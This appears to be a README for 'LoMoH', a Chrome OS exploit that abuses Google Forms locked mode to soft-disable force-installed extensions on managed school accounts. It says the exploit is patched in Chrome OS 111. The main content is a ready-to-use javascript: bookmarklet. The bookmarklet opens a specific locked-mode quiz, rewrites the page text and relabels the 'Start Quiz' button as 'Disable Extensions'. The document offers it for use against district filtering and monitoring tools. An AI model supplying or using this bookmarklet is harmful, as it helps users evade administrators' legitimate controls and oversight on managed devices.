# LoMoH
Formerly named "Locked Mode Hack," this is a Chrome OS exploit that uses the locked mode feature to soft disable extensions that are force-enabled on managed accounts (Excluding Hapara Highlights and Read&Write if installed).

# Patched
LoMoH is patched in **Chrome OS 111** and later versions.

With districts blocking javascript:// URLs to prevent the use of other exploits like LTBEEF, the website version of LoMoH was made, but it posed a vulnerability for web filters to send site traffic of the site to administrators.

# Issues
Screenshots are blocked while LoMoH is working. The website has a screenshot button to help with this issue.

# Bookmarklet Version
```js
javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()
```
